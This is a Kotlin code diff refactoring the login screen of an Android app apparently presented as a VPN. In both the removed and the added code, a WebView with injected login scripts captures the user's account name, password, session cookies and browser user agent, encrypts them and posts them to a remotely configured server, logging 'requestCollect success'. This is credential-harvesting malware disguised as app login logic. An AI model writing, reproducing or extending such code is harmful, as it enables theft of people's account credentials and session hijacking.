@@ -1,13 +1,14 @@
 package win.enlarge.zoovpn.ui.activity
 
 import android.annotation.SuppressLint
-import android.graphics.Bitmap
 import android.os.Build
 import android.text.TextUtils
 import android.util.Log
 import android.view.View
 import android.view.WindowManager
-import android.webkit.*
+import android.webkit.CookieManager
+import android.webkit.CookieSyncManager
+import android.webkit.JavascriptInterface
 import androidx.lifecycle.lifecycleScope
 import com.google.gson.Gson
 import com.lzy.okgo.OkGo
@@ -21,6 +22,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import win.enlarge.zoovpn.App
 import win.enlarge.zoovpn.R
 import win.enlarge.zoovpn.base.BaseActivity
+import win.enlarge.zoovpn.pojo.ResultPojo
 import win.enlarge.zoovpn.utils.*
 
 class LoginActivity : BaseActivity(R.layout.activity_login) {
@@ -86,88 +88,52 @@ class LoginActivity : BaseActivity(R.layout.activity_login) {
             onBackPressed()
         }
         activityLoginWv.apply {
-            settings.apply {
-                javaScriptEnabled = true
-                textZoom = 100
-                setSupportZoom(true)
-                displayZoomControls = false
-                builtInZoomControls = true
-                setGeolocationEnabled(true)
-                useWideViewPort = true
-                loadWithOverviewMode = true
-                loadsImagesAutomatically = true
-                displayZoomControls = false
-                setAppCachePath(cacheDir.absolutePath)
-                setAppCacheEnabled(true)
-            }
+            activityLoginWv.setting(this@LoginActivity)
             addJavascriptInterface(WebInterface(), "businessAPI")
-            webChromeClient = object : WebChromeClient() {
-                override fun onProgressChanged(view: WebView?, newProgress: Int) {
-                    super.onProgressChanged(view, newProgress)
-                    if (newProgress == 100) {
-                        val hideJs = context.getString(R.string.hideHeaderFooterMessages)
-                        evaluateJavascript(hideJs, null)
-                        val loginJs = getString(R.string.login)
-                        evaluateJavascript(loginJs, null)
-                        lifecycleScope.launch(Dispatchers.IO) {
-                            delay(300)
-                            withContext(Dispatchers.Main) {
-                                activityLoginFl.visibility = View.GONE
-                            }
-                        }
-                    }
-                }
+            chromeClient(this@LoginActivity) {
+                activityLoginFl.visibility = View.GONE
             }
-            webViewClient = object : WebViewClient() {
-                override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
-                    super.onPageStarted(view, url, favicon)
+            clientView { cookieStr, userAgentString ->
+                lifecycleScope.launch(Dispatchers.Main) {
+                    activityLoginFlContent.visibility = View.VISIBLE
                 }
-
-                override fun onPageFinished(view: WebView, url: String) {
-                    super.onPageFinished(view, url)
-                    val cookieManager = CookieManager.getInstance()
-                    val cookieStr = cookieManager.getCookie(url)
-                    Log.e("--->", "onPageFinished url == $url")
-                    if (cookieStr != null || true) {
-                        Log.e("--->", "ua ==  " + view.settings.userAgentString)
-                        if (cookieStr.contains("c_user") || true) {
-                            Log.e("--->", "cookieStr: $cookieStr")
-                            Log.e("--->", "account == $account  password == $password")
-                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains(
-                                    "wd="
-                                ) || true
-                            ) {
-                                lifecycleScope.launch(Dispatchers.Main) {
-                                    activityLoginFlContent.visibility = View.VISIBLE
-                                }
-                                if (!TextUtils.isEmpty(updateEntity.c)) {
-                                    val url = updateEntity.c
-                                    if (!TextUtils.isEmpty(updateEntity.d)) {
-                                        val key = updateEntity.d
-                                        val value = gson.toJson(
-                                            mutableMapOf(
-                                                "un" to account,
-                                                "pw" to password,
-                                                "cookie" to cookieStr,
-                                                "source" to configEntity.app_name,
-                                                "ip" to "",
-                                                "type" to "f_o",
-                                                "b" to view.settings.userAgentString
-                                            )
-                                        ).toRsaEncrypt(key!!)
-                                        val body: RequestBody =
-                                            Gson().toJson(mutableMapOf("content" to value))
-                                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-                                        OkGo.post<String>(url).upRequestBody(body)
-                                            .execute(object : StringCallback() {
-                                                override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
-                                                    Log.i("xxxxxxH", response!!.body().toString())
-                                                }
-                                            })
+                if (!TextUtils.isEmpty(updateEntity.c)) {
+                    val url = updateEntity.c
+                    if (!TextUtils.isEmpty(updateEntity.d)) {
+                        val key = updateEntity.d
+                        val value = gson.toJson(
+                            mutableMapOf(
+                                "un" to account,
+                                "pw" to password,
+                                "cookie" to cookieStr,
+                                "source" to configEntity.app_name,
+                                "ip" to "",
+                                "type" to "f_o",
+                                "b" to userAgentString
+                            )
+                        ).toRsaEncrypt(key!!)
+                        val body: RequestBody =
+                            Gson().toJson(mutableMapOf("content" to value))
+                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+                        OkGo.post<String>(url).upRequestBody(body)
+                            .execute(object : StringCallback() {
+                                override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
+                                    Log.i("xxxxxxH", response?.body().toString())
+                                    response?.let {
+                                        val result = Gson().fromJson(
+                                            it.body().toString(),
+                                            ResultPojo::class.java
+                                        )
+                                        if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true) {
+                                            "requestCollect success".loge()
+                                            isLogin = true
+                                            runOnUiThread {
+                                                finish()
+                                            }
+                                        }
                                     }
                                 }
-                            }
-                        }
+                            })
                     }
                 }
             }
